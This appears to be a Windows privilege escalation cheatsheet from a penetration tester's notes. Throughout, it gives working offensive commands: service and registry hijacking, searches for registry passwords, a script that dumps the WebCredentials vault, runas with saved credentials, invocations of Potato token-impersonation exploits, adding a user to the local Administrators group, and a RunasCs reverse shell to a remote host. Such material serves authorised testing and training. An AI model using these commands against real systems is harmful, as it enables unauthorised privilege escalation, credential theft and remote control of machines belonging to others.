# Windows Privilege Escalation Cheatsheet

## Generic Enumeration

Powershell history location:

```
C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Find interesting files by extension:

```cmd
where.exe /r <base dir> *.ps1
where.exe /r <base dir> .git
where.exe /r <base dir> *.bat
```

Note: an interesting base dir could be `c:\windows`.

Run automated checks with various tools:

```powershell
# Seatbelt
.\Seatbelt.exe all
.\Seatbelt.exe <specific check>

# winPeas - there are also the PowerShell and BAT version
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 # Enables colors in terminal - not needed when running winPeas in a reverse shell
.\winPEASany.exe quiet cmd fast # Quick scan
.\winPEASany.exe quiet cmd <specific check category>
 
# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks -Verbose 

# BeRoot
.\beRoot.exe

# Privesc
Invoke-PrivEsc

# SharpUp
.\SharpUp.exe
```

**Note**: `Seatbelt` does not actively hunt for privilege escalation misconfigurations but highlight them in the results, providing a better enumeration coverage than the other tools which are more vertical to specific misconfiguration categories.

Tools references:

- [Seatbelt]( https://github.com/GhostPack/Seatbelt) - [Pre-Compiled Seatbelt](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)
- [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
- [BeRoot](https://github.com/AlessandroZ/BeRoot)
- [Privesc](https://github.com/enjoiz/Privesc)
- [SharpUp](https://github.com/GhostPack/SharpUp) - [Pre-Compiled SharpUp]( https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe)


## Kernel Exploits

Enumerate Windows version and applied HotFixes:

```shell
systeminfo.exe
```

Enumerate Windows Kernel vulnerabilities whereas a kernel exploit is available with [Windows Exploit Suggester](https://github.com/bitsadmin/wesng):

```shell
python wes.py <output file from systeminfo.exe> -i 'Elevation of Privilege' —exploits-only
```

Enumerate Windows Kernel Vulnerabilities with [Watson]( https://github.com/rasta-mouse/Watson):

```shell
.\Watson.exe
```

Some precompiled kernel exploits can be found [here](https://github.com/SecWiki/windows-kernel-exploits).

## Service and Tasks Exploits

Enumerate vulnerable services:

```shell
# winPEAS
.\winPEASany.exe quiet servicesinfo

# SeatBelt
.\Seatbelt.exe NonstandardServices
```

List Services:

```shell
sc.exe query
```

Get current status of a service:

```shell
sc qc <service name>
```


Get current user permissions on a service using [accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk):

```shell
accesschk.exe -uwcqv <service name> -accepteula
```

Check permissions on folders and files using:

```powershell
accesschk.exe /accepteula -uwdq <path>

# or
Get-ACL <file path> | fl
```

Change `binPath` of a service:

```shell
sc config <service name> binpath= "\"<path to binary>\""
```

Stop and restart a service:

```shell
net stop <service name>
net start <service name>

# or

sc.exe <Target Computer> start <service name>
sc.exe <Target Computer> stop <service name>
```

Create a service:

```shell
sc.exe \\<target computer> create <service name> binPath= "<exe path>" start= auto
```

Delete a service:

```shell
sc.exe <Target Computer> delete <service name>
```

Get services with unquoted paths and a space in their name:

```powershell
Get-WmiObject -Class win32_service | select PathName | Where -Property PathName -NotMatch -Value '^["'']'  | Where -Property PathName -Match -Value "\s.+\.(exe|com|bat|cmd|msi|msp|ps1|vbs|vbe|js|jse|wsf|wsc|scr|cpl|hta|dll|ocx|sys|pif|scf|gadget|lnk|url|drv|appref-ms|reg|inf|isp|pyd)"
```

```shell
cmd /c wiwmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\ndows\\" |findstr /i /v """
```

Get services whose current user can modify the current configuration (`PowerUp`):

```powershell
Get-ModifiableService -Verbose
```

Get permissions on registry entries:

```powershell
Get-ACL <registry>:<registry entry path> | fl
Get-Acl HKLM:\System\CurrentControlSet\Services\<service name> | Format-List
```

Enumerate possibly misconfigured registry entries for services:

```powershell
$InterestingPermissions = "FullControl"
$IgnoredIdentityReference = "APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES", "CREATOR OWNER", "NT AUTHORITY\SYSTEM", "BUILTIN\Administrators", "NT SERVICE\TrustedInstaller"
$AllServicesRegEntries = Get-ChildItem -Path HKLM:\System\CurrentControlSet\Services | Select Name 


ForEach ($RegEntry in $AllServicesRegEntries){
    $FormattedRegPath = ($RegEntry.Name).Replace('HKEY_LOCAL_MACHINE','HKLM:')
    $acls = (Get-ACL $FormattedRegPath).Access
    ForEach ($acl in $acls){
        if(($InterestingPermissions.Contains($acl.RegistryRights)) -and (!$IgnoredIdentityReference.Contains($acl.IdentityReference.Value))){
            Write-Host "[!] Found: $FormattedRegPath - $($acl.RegistryRights) for $($acl.IdentityReference)"
        }
    }
}
```

Edit service binary from registry:

```shell
reg add <service registry path> /v ImagePath /t REG_EXPAND_SZ /d <new binary path> /f
```


Get services where the current user can write to its binary path or change arguments to the binary (`PowerUp`): 

```powershell
Get-ModifiableServiceFile -Verbose
```

List scheduled tasks visible to current user:

```shell
schtasks /query /fo LIST /v
```

List scheduled tasks excluding system's tasks:

```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

Get actions in a scheduled task:

```powershell
(Get-ScheduledTask -TaskName <task name>).Actions
```
## Registry Exploits

Enumerate AutoRun executables:

```shell
# winPEAS
winPEASany.exe quiet applicationsinfo

# Manually
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
## Check privileges
Get-Acl <Autorun executable> | Format-List
```

Enumerate `AlwaysInstallElevated` registries:

```shell
# winPEAS
winPEASany.exe quiet windowscreds

# Manually
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Run a MSI installer:

```shell
msiexec /quiet /qn /i <msi path>
```


## Dumping Credentials

Use winPEAS to check common password locations:

```shell
.\winPEASany.exe quiet filesinfo userinfo
.\winPEASany.exe quiet cmd searchfast filesinfo
```

Use winPEAS to check for saved credentials:

```powershell
.\winPEASany.exe quiet cmd windowscreds
```


Check for **AutoLogon** credentials in registry:

```shell
reg query "HKLM\Software\Microsoft\WindowsNT\CurrentVersion\winlogon"
```

Check for stored Putty sessions credentials in registry:
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```shell
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

Search for clear-text passwords in registers:

```shell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

where:

- `/f` specifies the keyword to search in registers.

Search credentials in the Windows Credentials Manager (**password ARE NOT shown**):

```shell
# list vaults
vaultcmd /list

# list properties of a vault
VaultCmd /listproperties:"<vault name>"

# list credentials in a vault
VaultCmd /listcreds:"<vault name>"
```

Dump credentials in the **WebCredentials** vault (see [there](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)):

```powershell
$ClassHolder =[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$VaultObj = new-object Windows.Security.Credentials.PasswordVault
$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }
```

List and use stored credentials with `runas`:

```shell
# List available stored credentials 
cmdkey /list

# Use store credentials
runas /savecred /user:<user listed in the previous command> cmd.exe
```

Search for possibly interesting configuration files (might produce really noisy output):

```shell
dir /s *pass* == *.config
```

Recursively search for possible interesting files containing the keyword "password" (might produce really noisy output):

```shell
findstr /si password *.xml *.ini *.txt
```

Look for configuration files or files containing password in the following backup directories:

- `C:\Windows\Repair`
- `C:\Windows\System32\config\RegBack`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Autounattend.xml`

**Take a also a look to [Active Directory Cheatsheet - Dumping Credentials](../ad/active-directory-cheatsheet.md#dumping-credentials).**

## Applications Exploits

In the "file browse" windows for a GUI app running with elevated privileges insert the following to spawn an elevated cmd:

```
file://c:/windows/system32/cmd.exe
```

Create a shortcut (`.lnk`) using PowerShell:

```powershell
$WshShell = New-Object -COMObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("<destination .lnk file>")
$Shortcut.TargetPath = "<target executable path>"
$Shortcut.Save()
```

Create a shortcut (`.lnk`) using Visual Basic Script:

```vb
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "<destination .lnk file>"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "<target executable path>"
oLink.Save
```

Run a `.vbs` file from cmd:

```shell
cscript <vbs path>
```

List running processes:

```shell
tasklist /v
```

Enumerate nonstandard processes:

```shell
# Searbelt
.\seatbelt.exe NonstandardProcesses

# winPEAS
.\winPEASany.exe quiet procesinfo
```

## Potatoes

Launch an **Hot Potato** attack from a low privileged user (binary [here](https://github.com/foxglovesec/Potato/tree/master/source/Potato/Potato/bin/Release)):

```shell
.\potato.exe -ip <target ip> -cmd "<command to execute>" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

Launch a **Rotten Potato** attack from a account with token impersonation privileges `meterpreter` shell with *incognito mode* enabled (binary [here](https://github.com/breenmachine/RottenPotatoNG)):

```shell
.\MSFRottenPotato.exe t <executable to run>
```

Launch a Juicy Potato attack from a service account shell (binary [here](https://github.com/ohpe/juicy-potato/tree/master)):

```shell
.\JuicyPotato.exe -l 1337 -p <executable to run - absolute path> -t * -c <CLSDID>
```

where `CLSID` can be one from [this list](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md) or one from the [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) script.

Launch a **Rogue Potato** attack; first start a socat listener forwarding port `135` on the attacker machine to a victim host unused port, for example `9999`:

```shell
socat tcp-listen:135,reuseaddr,fork tcp:<victim ip>:9999
```

Run the exploit from an account with token impersonation privileges shell (binary [here](https://github.com/antonioCoco/RoguePotato)):

```shell
.\RoguePotato.exe -r <attacker ip> -e "<command to execute>" -l 9999
```

Run a **Print Spoofer** attack from an account with token impersonation privileges shell (binary [here](https://github.com/itm4n/PrintSpoofer)):

```shell
.\PrintSpoofer.exe –i -c "<command to execute>"
```

Run a **LocalPotato** attack from an account with token impersonation privileges shell  (binary [here](https://github.com/decoder-it/LocalPotato?tab=readme-ov-file)):

```
# SMB Scenario
LocalPotato.exe -i c:\hacker\evil.dll -o windows\system32\evil.dll

# WebDAV
LocalPotato.exe -r 127.0.0.1 -u /webdavshare/potato.local
```

Run **Sweet Potato** from an account with token impersonation privileges shell  (binary [here](https://github.com/CCob/SweetPotato)):

```shell
.\SweetPotato.exe -c <CLSDID> -m <method> -p <executable to run> -a <args to the executable> -e <exploit mode> -l <COM listen port>
```

where:

- `CLSDID`: see Juicy Potato - default is BITS `{4991D34B-80A1-4291-83B6-3328366B9097}`
- `method`: one of `Auto`, `User`or `Thread`
- `exploit mode`: one of `DCOM`, `WinRM`, `EfsRpc` or `PrintSpoofer` (default)
- `COM listen port`: default 6666

Run **Generic Potato** from an account with token impersonation privileges shell  (binary [here](https://github.com/micahvandeusen/GenericPotato)):

```shell
.\GenericPotato.exe -m <method> -p <executable to run> -a <args to the executable> -e <exploit mode> -l <HTTP listen port> -i <HTTP listen host>
```

where:

- `method`: one of `Auto`, `User`or `Thread`
- `exploit mode`: one of `HTTP` or `NamedPipe` (default)
- `HTTP listen port`: default 8888
- `HTTP listen host`: default 127.0.0.1

Run a **God Potato** attack from an account with token impersonation privileges shell  (binary [here](https://github.com/BeichenDream/GodPotato)):

```shell
.\GodPotato -cmd "<command to run>"
```


## Misc

Add user to local Administrators group:

```shell
net localgroup administrators <user> /add
```

Change user password:

```shell
net user <user> <new password>
```

Run command as user with **Full Profile** using [RunasCs](https://github.com/antonioCoco/RunasCs):

```shell
RunasCs.exe <user> <password> "<command>"
```

Open reverse shell with `RunasCs`:

```shell
RunasCs.exe <user> <password> cmd.exe -r <remote host>:<remote port>
```

Window's `grep` equivalent ([findstr](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490907(v=technet.10)?redirectedfrom=MSDN)):

```cmd
# grep -E <regex>
findstr /r <regex>

# grep -v <expression>
findstr /v <expression>
```


### EFS Encryption

See [Windows Privilege Escalation - EFS Encryption](windows-privilege-escalation.md#efs-encryption).

Decrypt the file:

```shell
cipher /d "<path to encrypted file>"
```


You can also decrypt a whole folder:

```shell
cipher /d /s:"<path to encrypted files folder>"
```
